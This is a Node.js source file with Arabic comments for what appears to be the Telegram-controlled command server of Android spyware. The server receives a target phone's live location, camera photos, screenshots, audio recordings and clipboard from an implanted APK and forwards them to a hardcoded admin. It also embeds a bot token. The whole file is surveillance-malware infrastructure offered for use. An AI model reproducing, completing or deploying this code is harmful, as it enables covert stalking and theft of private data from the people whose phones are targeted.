// =============================================
// 🤖 نظام التحكم الكامل بالهاتف عبر التلجرام
// 👤 المبرمج: George96399
// 📞 آيدي التلجرام: 7604667042
// =============================================

const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const app = express();

// ================================
// ⚙️  الإعدادات - عدل هنا فقط
// ================================

// 1. 🔐 ضع توكن البوت هنا
const TELEGRAM_TOKEN = '8422146946:AAF3MXu0dfIh1t0KkX_TWLqvKN7YV4Vulw8';

// 2. 🆔 ضع آيدي التلجرام الخاص بك هنا (رقم فقط)
const ADMIN_IDS = ['7604667042'];

// 3. 🌐 رابط الاستضافة (سيتغير بعد رفع الملفات)
const SERVER_URL = 'https://king13-tl11.onrender.com';

// ================================
// 🚀 لا تعدل أي شيء تحت هذا السطر
// ================================

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const port = process.env.PORT || 3000;

// حالة الجهاز
let deviceStatus = {
    connected: false,
    lastSeen: null,
    deviceInfo: null
};

// إعداد Express
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// ================================
// 🌐 Endpoints لاستقبال بيانات الـ APK
// ================================

// 🔗 ربط الجهاز
app.post('/apk/connect', (req, res) => {
    try {
        const { deviceId, deviceName, androidVersion, battery } = req.body;
        
        deviceStatus = {
            connected: true,
            lastSeen: new Date(),
            deviceInfo: {
                id: deviceId,
                name: deviceName,
                android: androidVersion,
                battery: battery
            }
        };
        
        console.log('✅ تم ربط الجهاز:', deviceName);
        notifyAdmins(`📱 **تم ربط جهاز جديد**\n📟 الإسم: ${deviceName}\n🤖 الأندرويد: ${androidVersion}\n🔋 البطارية: ${battery}%`);
        
        res.json({ 
            success: true, 
            message: 'تم الربط بنجاح',
            server_url: SERVER_URL
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 📍 استقبال الموقع
app.post('/apk/location', (req, res) => {
    try {
        const { latitude, longitude, accuracy } = req.body;
        
        console.log('📍 موقع جديد:', latitude, longitude);
        
        // إشعار الموقع للمسؤول
        notifyAdmins(`📍 **موقع جديد**\n🌍 خط العرض: ${latitude}\n🌍 خط الطول: ${longitude}\n🎯 الدقة: ${accuracy} متر`);
        
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 📸 استقبال الصور
app.post('/apk/upload', (req, res) => {
    try {
        const { type, imageUrl, timestamp } = req.body;
        
        console.log('📸 تم استقبال صورة:', type);
        
        // إرسال الصورة للمسؤول
        ADMIN_IDS.forEach(chatId => {
            bot.sendPhoto(chatId, imageUrl, {
                caption: `📸 ${type === 'screenshot' ? 'لقطة شاشة' : 'صورة كاميرا'}\n🕒 ${new Date(timestamp).toLocaleTimeString()}`
            });
        });
        
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 🎙️ استقبال التسجيلات الصوتية
app.post('/apk/audio', (req, res) => {
    try {
        const { audioUrl, duration, timestamp } = req.body;
        
        console.log('🎙️ تم استقبال تسجيل صوتي:', duration + 'ثانية');
        
        // إرسال التسجيل للمسؤول
        ADMIN_IDS.forEach(chatId => {
            bot.sendAudio(chatId, audioUrl, {
                caption: `🎙️ تسجيل صوتي\n⏱️ المدة: ${duration} ثانية\n🕒 ${new Date(timestamp).toLocaleTimeString()}`
            });
        });
        
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ================================
// 🤖 أوامر التلجرام
// ================================

// 📋 القائمة الرئيسية
const mainMenu = {
    reply_markup: {
        inline_keyboard: [
            [{ text: '📡 معلومات الجهاز', callback_data: 'device_info' }],
            [{ text: '📍 الموقع الحي', callback_data: 'live_location' }],
            [{ text: '📷 الكاميرا', callback_data: 'camera_menu' }],
            [{ text: '🎙️ الصوت', callback_data: 'audio_menu' }],
            [{ text: '📸 لقطة شاشة', callback_data: 'screenshot' }],
            [{ text: '⚙️ تحكم متقدم', callback_data: 'advanced_menu' }]
        ]
    }
};

// 🏁 أمر البدء
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (!ADMIN_IDS.includes(chatId.toString())) {
        return bot.sendMessage(chatId, '❌ غير مصرح لك باستخدام هذا البوت');
    }
    
    const welcomeMessage = `
🤖 **نظام التحكم الكامل بالهاتف**  
👤 **المستخدم:** George96399  

📱 **حالة الجهاز:** ${deviceStatus.connected ? '✅ متصل' : '❌ غير متصل'}  
🔗 **رابط السيرفر:** ${SERVER_URL}  

📍 **الميزات المتاحة:**  
• 📍 الموقع الجغرافي الحي  
• 📷 الكاميرا الأمامية والخلفية  
• 🎙️ تسجيل الصوت  
• 📸 لقطات الشاشة  
• 📳 التحكم بالاهتزاز  
• 📋 إدارة الحافظة  
    `;
    
    bot.sendMessage(chatId, welcomeMessage, { 
        parse_mode: 'Markdown',
        reply_markup: mainMenu.reply_markup 
    });
});

// 📊 حالة النظام
bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;
    if (!ADMIN_IDS.includes(chatId.toString())) return;
    
    const statusMessage = `
📊 **حالة النظام:**  

📱 **الاتصال:** ${deviceStatus.connected ? '✅ متصل' : '❌ غير متصل'}  
🕒 **آخر ظهور:** ${deviceStatus.lastSeen ? deviceStatus.lastSeen.toLocaleTimeString() : 'غير متصل'}  
🔋 **البطارية:** ${deviceStatus.deviceInfo?.battery || 'غير معروف'}%  
📟 **الجهاز:** ${deviceStatus.deviceInfo?.name || 'غير معروف'}  
🤖 **الأندرويد:** ${deviceStatus.deviceInfo?.android || 'غير معروف'}  
    `;
    
    bot.sendMessage(chatId, statusMessage, { parse_mode: 'Markdown' });
});

// 🔗 رابط الربط
bot.onText(/\/link/, (msg) => {
    const chatId = msg.chat.id;
    if (!ADMIN_IDS.includes(chatId.toString())) return;
    
    const linkMessage = `
🔗 **إعدادات الربط:**  

🌐 **رابط السيرفر:**  
\`${SERVER_URL}\`  

📱 **في تطبيق APK ضع هذا الرابط:**  
\`${SERVER_URL}\`  

📋 **Endpoints المتاحة:**  
• \`POST /apk/connect\` - ربط الجهاز  
• \`POST /apk/location\` - إرسال الموقع  
• \`POST /apk/upload\` - رفع الصور  
• \`POST /apk/audio\` - رفع التسجيلات  
    `;
    
    bot.sendMessage(chatId, linkMessage, { parse_mode: 'Markdown' });
});

// ================================
// 🎛️ معالجة الأزرار
// ================================

bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const chatId = msg.chat.id;

    if (!ADMIN_IDS.includes(chatId.toString())) return;

    try {
        switch(data) {
            case 'device_info':
                await getDeviceInfo(chatId);
                break;
            case 'live_location':
                await getLiveLocation(chatId);
                break;
            case 'camera_menu':
                await showCameraMenu(chatId);
                break;
            case 'audio_menu':
                await showAudioMenu(chatId);
                break;
            case 'screenshot':
                await takeScreenshot(chatId);
                break;
            case 'advanced_menu':
                await showAdvancedMenu(chatId);
                break;
            case 'camera_front':
                await captureCamera(chatId, 'front');
                break;
            case 'camera_back':
                await captureCamera(chatId, 'back');
                break;
            case 'record_10':
                await recordAudio(chatId, 10);
                break;
            case 'record_30':
                await recordAudio(chatId, 30);
                break;
            case 'vibrate':
                await vibrateDevice(chatId);
                break;
            case 'clipboard':
                await getClipboard(chatId);
                break;
        }
        
        bot.answerCallbackQuery(callbackQuery.id, { text: '✅ تم استلام الأمر' });
    } catch (error) {
        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ خطأ في التنفيذ' });
    }
});

// ================================
// 🛠️ دوال التحكم
// ================================

async function getDeviceInfo(chatId) {
    if (!deviceStatus.connected) {
        return bot.sendMessage(chatId, '❌ الجهاز غير متصل');
    }
    
    const info = `
📱 **معلومات الجهاز:**  

📟 **الإسم:** ${deviceStatus.deviceInfo.name}  
🤖 **الأندرويد:** ${deviceStatus.deviceInfo.android}  
🔋 **البطارية:** ${deviceStatus.deviceInfo.battery}%  
🕒 **آخر اتصال:** ${deviceStatus.lastSeen.toLocaleTimeString()}  
🔗 **الحالة:** ✅ متصل بالخادم  
    `;
    
    bot.sendMessage(chatId, info, { parse_mode: 'Markdown' });
}

async function getLiveLocation(chatId) {
    if (!deviceStatus.connected) {
        return bot.sendMessage(chatId, '❌ الجهاز غير متصل');
    }
    
    bot.sendMessage(chatId, '📍 جاري طلب الموقع الحي من الجهاز...');
    
    // سيتم إرسال الموقع عبر endpoint /apk/location
}

async function showCameraMenu(chatId) {
    const cameraMenu = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '📷 كاميرا خلفية', callback_data: 'camera_back' }],
                [{ text: '🤳 كاميرا أمامية', callback_data: 'camera_front' }],
                [{ text: '🔙 رجوع', callback_data: 'back_main' }]
            ]
        }
    };
    
    bot.sendMessage(chatId, '📷 اختر نوع الكاميرا:', cameraMenu);
}

async function showAudioMenu(chatId) {
    const audioMenu = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '🎙️ تسجيل 10 ثواني', callback_data: 'record_10' }],
                [{ text: '🎙️ تسجيل 30 ثانية', callback_data: 'record_30' }],
                [{ text: '🔙 رجوع', callback_data: 'back_main' }]
            ]
        }
    };
    
    bot.sendMessage(chatId, '🎙️ التحكم بالتسجيل الصوتي:', audioMenu);
}

async function showAdvancedMenu(chatId) {
    const advancedMenu = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '📳 اهتزاز الجهاز', callback_data: 'vibrate' }],
                [{ text: '📋 محتوى الحافظة', callback_data: 'clipboard' }],
                [{ text: '🔙 رجوع', callback_data: 'back_main' }]
            ]
        }
    };
    
    bot.sendMessage(chatId, '⚙️ الإعدادات المتقدمة:', advancedMenu);
}

async function captureCamera(chatId, type) {
    if (!deviceStatus.connected) {
        return bot.sendMessage(chatId, '❌ الجهاز غير متصل');
    }
    
    bot.sendMessage(chatId, `📷 جاري طلب صورة من الكاميرا ${type === 'front' ? 'الأمامية' : 'الخلفية'}...`);
    
    // سيتم إرسال الصورة عبر endpoint /apk/upload
}

async function takeScreenshot(chatId) {
    if (!deviceStatus.connected) {
        return bot.sendMessage(chatId, '❌ الجهاز غير متصل');
    }
    
    bot.sendMessage(chatId, '📸 جاري طلب لقطة الشاشة...');
    
    // سيتم إرسال لقطة الشاشة عبر endpoint /apk/upload
}

async function recordAudio(chatId, duration) {
    if (!deviceStatus.connected) {
        return bot.sendMessage(chatId, '❌ الجهاز غير متصل');
    }
    
    bot.sendMessage(chatId, `🎙️ جاري طلب تسجيل صوتي لمدة ${duration} ثانية...`);
    
    // سيتم إرسال التسجيل عبر endpoint /apk/audio
}

async function vibrateDevice(chatId) {
    if (!deviceStatus.connected) {
        return bot.sendMessage(chatId, '❌ الجهاز غير متصل');
    }
    
    bot.sendMessage(chatId, '📳 جاري تفعيل الاهتزاز...');
}

async function getClipboard(chatId) {
    if (!deviceStatus.connected) {
        return bot.sendMessage(chatId, '❌ الجهاز غير متصل');
    }
    
    bot.sendMessage(chatId, '📋 جاري طلب محتوى الحافظة...');
}

// ================================
// 📢 دوال مساعدة
// ================================

function notifyAdmins(message) {
    ADMIN_IDS.forEach(chatId => {
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' }).catch(console.error);
    });
}

// ================================
// 🌐 صفحة الويب الرئيسية
// ================================

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Android Control System - George96399</title>
            <meta charset="utf-8">
            <style>
                body { 
                    font-family: Arial, sans-serif; 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    text-align: center;
                    padding: 50px;
                    margin: 0;
                }
                .container {
                    background: rgba(255,255,255,0.1);
                    padding: 40px;
                    border-radius: 20px;
                    backdrop-filter: blur(10px);
                    max-width: 600px;
                    margin: 0 auto;
                    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
                }
                h1 { 
                    font-size: 2.5em; 
                    margin-bottom: 20px;
                    text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
                }
                .status { 
                    background: ${deviceStatus.connected ? '#28a745' : '#dc3545'}; 
                    color: white; 
                    padding: 15px; 
                    border-radius: 10px;
                    margin: 20px 0;
                    font-size: 1.2em;
                    font-weight: bold;
                }
                .info-box {
                    background: rgba(255,255,255,0.2);
                    padding: 20px;
                    border-radius: 10px;
                    margin: 15px 0;
                    text-align: left;
                }
                .url-box {
                    background: rgba(0,0,0,0.3);
                    padding: 15px;
                    border-radius: 8px;
                    font-family: monospace;
                    word-break: break-all;
                    margin: 10px 0;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🤖 نظام التحكم بالأندرويد</h1>
                
                <div class="status">
                    ${deviceStatus.connected ? 
                        '✅ الجهاز متصل - جاهز للتحكم' : 
                        '❌ الجهاز غير متصل - في انتظار الربط'}
                </div>
                
                <div class="info-box">
                    <h3>👤 معلومات المستخدم</h3>
                    <p><strong>الإسم:</strong> George96399</p>
                    <p><strong>آيدي التلجرام:</strong> 7604667042</p>
                </div>
                
                <div class="info-box">
                    <h3>🔗 رابط السيرفر</h3>
                    <div class="url-box">${SERVER_URL}</div>
                    <p>انسخ هذا الرابط وضعيه في تطبيق الـ APK</p>
                </div>
                
                <div class="info-box">
                    <h3>📡 حالة الجهاز</h3>
                    <p><strong>الحالة:</strong> ${deviceStatus.connected ? '🟢 متصل' : '🔴 غير متصل'}</p>
                    <p><strong>آخر اتصال:</strong> ${deviceStatus.lastSeen ? deviceStatus.lastSeen.toLocaleString() : 'لم يتم الربط بعد'}</p>
                    <p><strong>الجهاز:</strong> ${deviceStatus.deviceInfo?.name || 'غير معروف'}</p>
                </div>
                
                <div style="margin-top: 30px;">
                    <p>🚀 <strong>استخدم بوت التلجرام للتحكم الكامل</strong></p>
                    <p>📱 تأكد من تشغيل تطبيق الـ APK على الهاتف المستهدف</p>
                </div>
            </div>
        </body>
        </html>
    `);
});

// ================================
// 🚀 بدء التشغيل
// ================================

app.listen(port, () => {
    console.log('🚀 =================================');
    console.log('🤖 نظام التحكم بالأندرويد - George96399');
    console.log('📞 آيدي التلجرام: 7604667042');
    console.log('🔗 السيرفر شغال على PORT:', port);
    console.log('🌐 رابط السيرفر:', SERVER_URL);
    console.log('📱 في انتظار ربط الـ APK...');
    console.log('🚀 =================================');
    
    // إشعار بدء التشغيل
    ADMIN_IDS.forEach(chatId => {
        bot.sendMessage(chatId, 
            `🚀 **تم تشغيل السيرفر بنجاح**\n\n` +
            `🌐 **الرابط:** ${SERVER_URL}\n` +
            `📅 **الوقت:** ${new Date().toLocaleString()}\n` +
            `📱 **الحالة:** في انتظار ربط الجهاز`
        ).catch(console.error);
    });
});
